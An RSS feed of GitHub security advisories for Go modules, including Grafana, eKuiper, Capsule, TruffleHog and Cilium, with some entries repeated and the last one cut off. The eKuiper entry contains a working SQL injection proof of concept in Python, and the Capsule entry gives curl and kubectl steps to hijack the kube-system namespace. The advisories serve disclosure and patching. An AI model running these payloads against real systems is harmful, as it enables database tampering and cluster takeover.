<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-08-20T22:01:18.651Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana plugin data sources vulnerable to access control bypass]]></title>
        <id>https://github.com/advisories/GHSA-hh8p-374f-qgr5</id>
        <link href="https://github.com/advisories/GHSA-hh8p-374f-qgr5"/>
        <updated>2024-08-20T20:04:55.000Z</updated>
        <content type="html"><![CDATA[<p>Access control for plugin data sources protected by the ReqActions json field of the plugin.json is bypassed if the user or service account is granted associated access to any other data source, as the ReqActions check was not scoped to each specific datasource. The account must have prior query access to the impacted datasource.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6322">https://nvd.nist.gov/vuln/detail/CVE-2024-6322</a></li>
<li><a href="https://grafana.com/security/security-advisories/cve-2024-6322">https://grafana.com/security/security-advisories/cve-2024-6322</a></li>
<li><a href="https://github.com/grafana/grafana/commit/4cb3ba5d1a7ab8b9676034e89dada2fcde1766ef">https://github.com/grafana/grafana/commit/4cb3ba5d1a7ab8b9676034e89dada2fcde1766ef</a></li>
<li><a href="https://github.com/grafana/grafana/commit/9cdba084a9100c6b11d32eef9d2bd53656c6964a">https://github.com/grafana/grafana/commit/9cdba084a9100c6b11d32eef9d2bd53656c6964a</a></li>
<li><a href="https://github.com/advisories/GHSA-hh8p-374f-qgr5">https://github.com/advisories/GHSA-hh8p-374f-qgr5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hh8p-374f-qgr5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-20T18:31:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana plugin data sources vulnerable to access control bypass]]></title>
        <id>https://github.com/advisories/GHSA-hh8p-374f-qgr5</id>
        <link href="https://github.com/advisories/GHSA-hh8p-374f-qgr5"/>
        <updated>2024-08-20T20:04:55.000Z</updated>
        <content type="html"><![CDATA[<p>Access control for plugin data sources protected by the ReqActions json field of the plugin.json is bypassed if the user or service account is granted associated access to any other data source, as the ReqActions check was not scoped to each specific datasource. The account must have prior query access to the impacted datasource.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6322">https://nvd.nist.gov/vuln/detail/CVE-2024-6322</a></li>
<li><a href="https://grafana.com/security/security-advisories/cve-2024-6322">https://grafana.com/security/security-advisories/cve-2024-6322</a></li>
<li><a href="https://github.com/grafana/grafana/commit/4cb3ba5d1a7ab8b9676034e89dada2fcde1766ef">https://github.com/grafana/grafana/commit/4cb3ba5d1a7ab8b9676034e89dada2fcde1766ef</a></li>
<li><a href="https://github.com/grafana/grafana/commit/9cdba084a9100c6b11d32eef9d2bd53656c6964a">https://github.com/grafana/grafana/commit/9cdba084a9100c6b11d32eef9d2bd53656c6964a</a></li>
<li><a href="https://github.com/advisories/GHSA-hh8p-374f-qgr5">https://github.com/advisories/GHSA-hh8p-374f-qgr5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hh8p-374f-qgr5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-20T18:31:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/lf-edge/ekuiper] LF Edge eKuiper has a SQL Injection in sqlKvStore]]></title>
        <id>https://github.com/advisories/GHSA-r5ph-4jxm-6j9p</id>
        <link href="https://github.com/advisories/GHSA-r5ph-4jxm-6j9p"/>
        <updated>2024-08-20T20:04:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A user could utilize and exploit SQL Injection to allow the execution of malicious SQL query via Get method in sqlKvStore. </p>
<h3 id="details">Details</h3>
<p>I will use explainRuleHandler ("/rules/{name}/explain") as an example to illustrate. However, this vulnerability also exists in other methods such as sourceManageHandler, asyncTaskCancelHandler, pluginHandler, etc.</p>
<p>The SQL injection can happen in the code:
<a href="https://github.com/lf-edge/ekuiper/blob/d6457d008e129b1cdd54d76b5993992c349d1b80/internal/pkg/store/sql/sqlKv.go#L89-L93">https://github.com/lf-edge/ekuiper/blob/d6457d008e129b1cdd54d76b5993992c349d1b80/internal/pkg/store/sql/sqlKv.go#L89-L93</a>
The code to accept user input is:
<a href="https://github.com/lf-edge/ekuiper/blob/d6457d008e129b1cdd54d76b5993992c349d1b80/internal/server/rest.go#L274-L277">https://github.com/lf-edge/ekuiper/blob/d6457d008e129b1cdd54d76b5993992c349d1b80/internal/server/rest.go#L274-L277</a></p>
<p>The rule id in the above code can be used to exploit SQL query.</p>
<p>Note that the delete function is also vulnerable:
<a href="https://github.com/lf-edge/ekuiper/blob/d6457d008e129b1cdd54d76b5993992c349d1b80/internal/pkg/store/sql/sqlKv.go#L138-L141">https://github.com/lf-edge/ekuiper/blob/d6457d008e129b1cdd54d76b5993992c349d1b80/internal/pkg/store/sql/sqlKv.go#L138-L141</a></p>
<h3 id="poc">PoC</h3>
<pre><code>import requests
from urllib.parse import quote

# SELECT val FROM 'xxx' WHERE key='%s';
payload = f"""'; ATTACH DATABASE 'test93' AS test93;
CREATE TABLE test93.pwn (dataz text);
INSERT INTO test93.pwn (dataz) VALUES ("sql injection");--"""

#payload = "deadbeef'; SELECT 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))));--"

url = f"http://127.0.0.1:9081/rules/{quote(payload,safe='')}/explain"   # explainRuleHandler

res = requests.get(url)
print(res.content)
</code></pre>
<p>The screenshot shows the malicious SQL query to insert a value:
<img alt="image" src="https://github.com/user-attachments/assets/baf035cc-a561-4909-8d1f-e455e75375cb"></p>
<p>The screenshot shows the breakpoint of executing the query:
<img alt="image" src="https://github.com/user-attachments/assets/b9c29945-a0cc-4271-bdc8-c1bddfda5b6f"></p>
<h3 id="impact">Impact</h3>
<p>SQL Injection vulnerability</p>
<p>The reporters are Yuan Luo, Shuai Xiong, Haoyu Wang from Tencent YunDing Security Lab.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lf-edge/ekuiper/security/advisories/GHSA-r5ph-4jxm-6j9p">https://github.com/lf-edge/ekuiper/security/advisories/GHSA-r5ph-4jxm-6j9p</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43406">https://nvd.nist.gov/vuln/detail/CVE-2024-43406</a></li>
<li><a href="https://github.com/lf-edge/ekuiper/commit/1a9c745649438feaac357d282959687012b65503">https://github.com/lf-edge/ekuiper/commit/1a9c745649438feaac357d282959687012b65503</a></li>
<li><a href="https://github.com/advisories/GHSA-r5ph-4jxm-6j9p">https://github.com/advisories/GHSA-r5ph-4jxm-6j9p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r5ph-4jxm-6j9p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-20T20:04:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/projectcapsule/capsule] Capsule tenant owner with "patch namespace" permission can hijack system namespaces]]></title>
        <id>https://github.com/advisories/GHSA-mq69-4j5w-3qwp</id>
        <link href="https://github.com/advisories/GHSA-mq69-4j5w-3qwp"/>
        <updated>2024-08-20T18:34:37.000Z</updated>
        <content type="html"><![CDATA[<h1 id="attack-vector">Attack Vector</h1>
<p>Then, let me briefly explain the reasons for the errors mentioned above: 1. The 'kubectl edit' command was used to patch the namespace, but this operation requires both 'get' and 'patch' permissions, hence the error. One should use methods like 'curl' to directly send a PATCH request; 2. The webhook does not intercept patch operations on 'kube-system' because 'kube-system' does not have an ownerReference.</p>
<h1 id="below-are-my-detailed-reproduction-steps">Below are my detailed reproduction steps</h1>
<ol>
<li>Create a test cluster
<code>kind create cluster --image=kindest/node:v1.24.15 --name=k8s</code></li>
<li>Install the capsule
<code>helm install capsule projectcapsule/capsule -n capsule-system --create-namespace</code></li>
<li>Create a tenant</li>
</ol>
<pre><code>kubectl create -f - &lt;&lt; EOF
apiVersion: capsule.clastix.io/v1beta2
kind: Tenant
metadata:
  name: tenant1
spec:
  owners:
  - name: alice
    kind: User
EOF
</code></pre>
<ol start="4">
<li>Create user alice</li>
</ol>
<pre><code>./create-user.sh alice tenant1 capsule.clastix.io
export KUBECONFIG=alice-tenant1.kubeconfig
</code></pre>
<ol start="5">
<li>Patch kube-system (The first command is executed in the current shell, while the 2nd and 3rd commands require a different shell window because the current shell is being used as a proxy.)</li>
</ol>
<pre><code>kubectl proxy

export DATA='[{"op": "add", "path": "/metadata/ownerReferences", "value":[{"apiVersion": "capsule.clastix.io/v1beta2", "blockOwnerDeletion": true, "controller": true, "kind": "Tenant", "name": "tenant1", "uid": "ce3f2296-4aaa-45b0-a8fe-879d5096f193"}]}]'

curl http://localhost:8001/api/v1/namespaces/kube-system/ -X PATCH -d "$DATA" -H "Content-Type: application/json-patch+json"
</code></pre>
<ol start="7">
<li>Check the result
The kube-system is patched successfully.
<img alt="image" src="https://github.com/projectcapsule/capsule/assets/151004196/e2775304-c1f4-494d-ab15-14f6f33e29ec"></li>
</ol>
<h1 id="summary">Summary</h1>
<p>The tenant-owner can patch any arbitrary namespace that has not been taken over by a tenant (i.e., namespaces without the ownerReference field), thereby gaining control of that namespace.</p>
<p>I would like to express my apologies once again. I have always been sincere in my research and communication, and I did not intend to disturb you on purpose.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/projectcapsule/capsule/security/advisories/GHSA-mq69-4j5w-3qwp">https://github.com/projectcapsule/capsule/security/advisories/GHSA-mq69-4j5w-3qwp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39690">https://nvd.nist.gov/vuln/detail/CVE-2024-39690</a></li>
<li><a href="https://github.com/projectcapsule/capsule/commit/d620b0457ddec01616b8eab8512a10611611f584">https://github.com/projectcapsule/capsule/commit/d620b0457ddec01616b8eab8512a10611611f584</a></li>
<li><a href="https://github.com/advisories/GHSA-mq69-4j5w-3qwp">https://github.com/advisories/GHSA-mq69-4j5w-3qwp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mq69-4j5w-3qwp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-20T18:34:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/trufflesecurity/trufflehog/v3] Trufflehog vulnerable to Blind SSRF in some Detectors]]></title>
        <id>https://github.com/advisories/GHSA-3r74-v83p-f4f4</id>
        <link href="https://github.com/advisories/GHSA-3r74-v83p-f4f4"/>
        <updated>2024-08-19T17:29:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>This vulnerability allows a malicious actor to craft data in a way that, when scanned by specific detectors, could trigger the detector to make an unauthorized request to an endpoint chosen by the attacker. For an exploit to be effective, the target endpoint must be an unauthenticated GET endpoint that produces side effects. The victim must scan the maliciously crafted data and have such an endpoint targeted for the exploit to succeed.</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p>The vulnerability has been resolved in TruffleHog v3.81.9 and later versions. Users should upgrade to this or a more recent version to mitigate the issue.</p>
<p><em>Special thanks to Karan Bamal, Security Researcher at Sentinel One for this discovery</em></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/trufflesecurity/trufflehog/security/advisories/GHSA-3r74-v83p-f4f4">https://github.com/trufflesecurity/trufflehog/security/advisories/GHSA-3r74-v83p-f4f4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43379">https://nvd.nist.gov/vuln/detail/CVE-2024-43379</a></li>
<li><a href="https://github.com/trufflesecurity/trufflehog/commit/fe5624c70923355128868cffd647b6e2cfe11443">https://github.com/trufflesecurity/trufflehog/commit/fe5624c70923355128868cffd647b6e2cfe11443</a></li>
<li><a href="https://github.com/advisories/GHSA-3r74-v83p-f4f4">https://github.com/advisories/GHSA-3r74-v83p-f4f4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3r74-v83p-f4f4</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-08-19T17:29:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/stashapp/stash] SQL injection in github.com/stashapp/stash]]></title>
        <id>https://github.com/advisories/GHSA-75jf-52jg-qqh4</id>
        <link href="https://github.com/advisories/GHSA-75jf-52jg-qqh4"/>
        <updated>2024-08-16T19:27:56.000Z</updated>
        <content type="html"><![CDATA[<p>Stash up to v0.25.1 was discovered to contain a SQL injection vulnerability via the sort parameter.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32231">https://nvd.nist.gov/vuln/detail/CVE-2024-32231</a></li>
<li><a href="https://github.com/stashapp/stash/pull/4865">https://github.com/stashapp/stash/pull/4865</a></li>
<li><a href="https://github.com/stashapp/stash/commit/89553864f5fa92beaa37a12e489064b1358d9880">https://github.com/stashapp/stash/commit/89553864f5fa92beaa37a12e489064b1358d9880</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3070">https://pkg.go.dev/vuln/GO-2024-3070</a></li>
<li><a href="https://github.com/advisories/GHSA-75jf-52jg-qqh4">https://github.com/advisories/GHSA-75jf-52jg-qqh4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75jf-52jg-qqh4</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-08-15T18:31:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Cilium leaks information via incorrect ReferenceGrant update logic in Gateway API]]></title>
        <id>https://github.com/advisories/GHSA-vwf8-q6fw-4wcm</id>
        <link href="https://github.com/advisories/GHSA-vwf8-q6fw-4wcm"/>
        <updated>2024-08-16T18:45:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Due to ReferenceGrant changes not being immediately propagated in Cilium's GatewayAPI controller, Gateway resources are able to access secrets in other namespaces after the associated ReferenceGrant has been revoked. This can lead to Gateways continuing to establish sessions using secrets that they should no longer have access to.</p>
<h3 id="patches">Patches</h3>
<p>This issue was resolved in <a href="https://github.com/cilium/cilium/pull/34032">https://github.com/cilium/cilium/pull/34032</a>.</p>
<p>This issue affects:</p>
<ul>
<li>Cilium v1.15 between v1.15.0 and v1.15.7 inclusive</li>
<li>Cilium v1.16.0</li>
</ul>
<p>This issue has been patched in:</p>
<ul>
<li>Cilium v1.15.8</li>
<li>Cilium v1.16.1</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Any modification of a related Gateway/HTTPRoute/GRPCRoute/TCPRoute CRD (for example, adding any label to any of these resources) will trigger a reconciliation of ReferenceGrants on an affected cluster.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Cure53 and Isovalent to prepare these mitigations. Special thanks to @sayboras for resolving this issue.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>If you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list for the Cilium security team, and your report will be treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-vwf8-q6fw-4wcm">https://github.com/cilium/cilium/security/advisories/GHSA-vwf8-q6fw-4wcm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42486">https://nvd.nist.gov/vuln/detail/CVE-2024-42486</a></li>
<li><a href="https://github.com/cilium/cilium/pull/34032">https://github.com/cilium/cilium/pull/34032</a></li>
<li><a href="https://github.com/cilium/cilium/commit/414a96b53d51ef6e6645c44426e26bc8e7c7c059">https://github.com/cilium/cilium/commit/414a96b53d51ef6e6645c44426e26bc8e7c7c059</a></li>
<li><a href="https://github.com/cilium/cilium/commit/92c110e58a7be6586819dd51fb0f6ee1ec4be8f8">https://github.com/cilium/cilium/commit/92c110e58a7be6586819dd51fb0f6ee1ec4be8f8</a></li>
<li><a href="https://github.com/cilium/cilium/commit/ed3dfa0aab8b80f7e841a6d49d2a990ac2dca053">https://github.com/cilium/cilium/commit/ed3dfa0aab8b80f7e841a6d49d2a990ac2dca053</a></li>
<li><a href="https://github.com/advisories/GHSA-vwf8-q6fw-4wcm">https://github.com/advisories/GHSA-vwf8-q6fw-4wcm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vwf8-q6fw-4wcm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-16T18:45:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Cilium leaks information via incorrect ReferenceGrant update logic in Gateway API]]></title>
        <id>https://github.com/advisories/GHSA-vwf8-q6fw-4wcm</id>
        <link href="https://github.com/advisories/GHSA-vwf8-q6fw-4wcm"/>
        <updated>2024-08-16T18:45:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Due to ReferenceGrant changes not being immediately propagated in Cilium's GatewayAPI controller, Gateway resources are able to access secrets in other namespaces after the associated ReferenceGrant has been revoked. This can lead to Gateways continuing to establish sessions using secrets that they should no longer have access to.</p>
<h3 id="patches">Patches</h3>
<p>This issue was resolved in <a href="https://github.com/cilium/cilium/pull/34032">https://github.com/cilium/cilium/pull/34032</a>.</p>
<p>This issue affects:</p>
<ul>
<li>Cilium v1.15 between v1.15.0 and v1.15.7 inclusive</li>
<li>Cilium v1.16.0</li>
</ul>
<p>This issue has been patched in:</p>
<ul>
<li>Cilium v1.15.8</li>
<li>Cilium v1.16.1</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Any modification of a related Gateway/HTTPRoute/GRPCRoute/TCPRoute CRD (for example, adding any label to any of these resources) will trigger a reconciliation of ReferenceGrants on an affected cluster.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Cure53 and Isovalent to prepare these mitigations. Special thanks to @sayboras for resolving this issue.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>If you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list for the Cilium security team, and your report will be treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-vwf8-q6fw-4wcm">https://github.com/cilium/cilium/security/advisories/GHSA-vwf8-q6fw-4wcm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42486">https://nvd.nist.gov/vuln/detail/CVE-2024-42486</a></li>
<li><a href="https://github.com/cilium/cilium/pull/34032">https://github.com/cilium/cilium/pull/34032</a></li>
<li><a href="https://github.com/cilium/cilium/commit/414a96b53d51ef6e6645c44426e26bc8e7c7c059">https://github.com/cilium/cilium/commit/414a96b53d51ef6e6645c44426e26bc8e7c7c059</a></li>
<li><a href="https://github.com/cilium/cilium/commit/92c110e58a7be6586819dd51fb0f6ee1ec4be8f8">https://github.com/cilium/cilium/commit/92c110e58a7be6586819dd51fb0f6ee1ec4be8f8</a></li>
<li><a href="https://github.com/cilium/cilium/commit/ed3dfa0aab8b80f7e841a6d49d2a990ac2dca053">https://github.com/cilium/cilium/commit/ed3dfa0aab8b80f7e841a6d49d2a990ac2dca053</a></li>
<li><a href="https://github.com/advisories/GHSA-vwf8-q6fw-4wcm">https://github.com/advisories/GHSA-vwf8-q6fw-4wcm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vwf8-q6fw-4wcm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-16T18:45:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Gateway API route matching order contradicts specification]]></title>
        <id>https://github.com/advisories/GHSA-qcm3-7879-xcww</id>
        <link href="https://github.com/advisories/GHSA-qcm3-7879-xcww"/>
        <updated>2024-08-15T21:46:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Gateway API HTTPRoutes and GRPCRoutes do not follow the match precedence specified in the Gateway API specification. In particular, request headers are matched before request methods, when the specification describes that the request methods must be respected before headers are matched (<a href="https://gateway-api.sigs.k8s.io/reference/spec/#gateway.networking.k8s.io/v1.HTTPRouteRule">HTTPRouteRule</a>, <a href="https://gateway-api.sigs.k8s.io/reference/spec/#gateway.networking.k8s.io%2fv1.GRPCRouteRule">GRPCRouteRule</a>).</p>
<p>If users create Gateway API resources that use both request headers and request methods in order to route to different destinations, then traffic may be delivered to the incorrect backend. If the backend does not have Network Policy restricting acceptable traffic to receive, then requests may access information that you did not intend for them to access.</p>
<h3 id="patches">Patches</h3>
<p>This issue was fixed in <a href="https://github.com/cilium/cilium/pull/34109">https://github.com/cilium/cilium/pull/34109</a>.</p>
<p>This issue affects:</p>
<ul>
<li>Cilium v1.15 between v1.15.0 and v1.15.7 inclusive</li>
<li>Cilium v1.16.0</li>
</ul>
<p>This issue is fixed in:</p>
<ul>
<li>Cilium v1.15.8</li>
<li>Cilium v1.16.1</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround for this issue.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Cure53 and Isovalent to prepare these mitigations. Special thanks to @sayboras for remediating this issue.</p>
<h3 id="further-information">Further information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>If you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list for the Cilium security team, and your report will be treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-qcm3-7879-xcww">https://github.com/cilium/cilium/security/advisories/GHSA-qcm3-7879-xcww</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42487">https://nvd.nist.gov/vuln/detail/CVE-2024-42487</a></li>
<li><a href="https://github.com/cilium/cilium/pull/34109">https://github.com/cilium/cilium/pull/34109</a></li>
<li><a href="https://github.com/cilium/cilium/commit/a3510fe4a92305822aa1a5e08cb6d6c873c8699a">https://github.com/cilium/cilium/commit/a3510fe4a92305822aa1a5e08cb6d6c873c8699a</a></li>
<li><a href="https://github.com/cilium/cilium/commit/d88772b9c29e370becbc4547cada6711d51edcde">https://github.com/cilium/cilium/commit/d88772b9c29e370becbc4547cada6711d51edcde</a></li>
<li><a href="https://github.com/cilium/cilium/commit/fe42273566a943a0f3174c87b23a195c856b51d6">https://github.com/cilium/cilium/commit/fe42273566a943a0f3174c87b23a195c856b51d6</a></li>
<li><a href="https://github.com/advisories/GHSA-qcm3-7879-xcww">https://github.com/advisories/GHSA-qcm3-7879-xcww</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qcm3-7879-xcww</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-15T21:46:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Gateway API route matching order contradicts specification]]></title>
        <id>https://github.com/advisories/GHSA-qcm3-7879-xcww</id>
        <link href="https://github.com/advisories/GHSA-qcm3-7879-xcww"/>
        <updated>2024-08-15T21:46:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Gateway API HTTPRoutes and GRPCRoutes do not follow the match precedence specified in the Gateway API specification. In particular, request headers are matched before request methods, when the specification describes that the request methods must be respected before headers are matched (<a href="https://gateway-api.sigs.k8s.io/reference/spec/#gateway.networking.k8s.io/v1.HTTPRouteRule">HTTPRouteRule</a>, <a href="https://gateway-api.sigs.k8s.io/reference/spec/#gateway.networking.k8s.io%2fv1.GRPCRouteRule">GRPCRouteRule</a>).</p>
<p>If users create Gateway API resources that use both request headers and request methods in order to route to different destinations, then traffic may be delivered to the incorrect backend. If the backend does not have Network Policy restricting acceptable traffic to receive, then requests may access information that you did not intend for them to access.</p>
<h3 id="patches">Patches</h3>
<p>This issue was fixed in <a href="https://github.com/cilium/cilium/pull/34109">https://github.com/cilium/cilium/pull/34109</a>.</p>
<p>This issue affects:</p>
<ul>
<li>Cilium v1.15 between v1.15.0 and v1.15.7 inclusive</li>
<li>Cilium v1.16.0</li>
</ul>
<p>This issue is fixed in:</p>
<ul>
<li>Cilium v1.15.8</li>
<li>Cilium v1.16.1</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround for this issue.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Cure53 and Isovalent to prepare these mitigations. Special thanks to @sayboras for remediating this issue.</p>
<h3 id="further-information">Further information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>If you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list for the Cilium security team, and your report will be treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-qcm3-7879-xcww">https://github.com/cilium/cilium/security/advisories/GHSA-qcm3-7879-xcww</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42487">https://nvd.nist.gov/vuln/detail/CVE-2024-42487</a></li>
<li><a href="https://github.com/cilium/cilium/pull/34109">https://github.com/cilium/cilium/pull/34109</a></li>
<li><a href="https://github.com/cilium/cilium/commit/a3510fe4a92305822aa1a5e08cb6d6c873c8699a">https://github.com/cilium/cilium/commit/a3510fe4a92305822aa1a5e08cb6d6c873c8699a</a></li>
<li><a href="https://github.com/cilium/cilium/commit/d88772b9c29e370becbc4547cada6711d51edcde">https://github.com/cilium/cilium/commit/d88772b9c29e370becbc4547cada6711d51edcde</a></li>
<li><a href="https://github.com/cilium/cilium/commit/fe42273566a943a0f3174c87b23a195c856b51d6">https://github.com/cilium/cilium/commit/fe42273566a943a0f3174c87b23a195c856b51d6</a></li>
<li><a href="https://github.com/advisories/GHSA-qcm3-7879-xcww">https://github.com/advisories/GHSA-qcm3-7879-xcww</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qcm3-7879-xcww</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-15T21:46:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Policy bypass for Host Firewall policy due to race condition in Cilium agent]]></title>
        <id>https://github.com/advisories/GHSA-q7w8-72mr-vpgw</id>
        <link href="https://github.com/advisories/GHSA-q7w8-72mr-vpgw"/>
        <updated>2024-08-15T22:35:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A race condition in the Cilium agent can cause the agent to ignore labels that should be applied to a node. This could in turn cause CiliumClusterwideNetworkPolicies intended for nodes with the ignored label to not apply, leading to policy bypass.</p>
<h3 id="patches">Patches</h3>
<p>This issue was fixed in <a href="https://github.com/cilium/cilium/pull/33511">https://github.com/cilium/cilium/pull/33511</a>.</p>
<p>This issue affects:</p>
<ul>
<li>All versions of Cilium before v1.14.14</li>
<li>Cilium v1.15 between v1.15.0 and v1.15.7 inclusive</li>
</ul>
<p>This issue has been patched in:</p>
<ul>
<li>Cilium v1.14.14</li>
<li>Cilium v1.15.8</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>As the underlying issue depends on a race condition, users unable to upgrade can restart the Cilium agent on affected nodes until the affected policies are confirmed to be working as expected.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Google and Isovalent to prepare these mitigations. Special thanks to @skmatti for raising and resolving this issue.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>If you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list for the Cilium security team, and your report will be treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
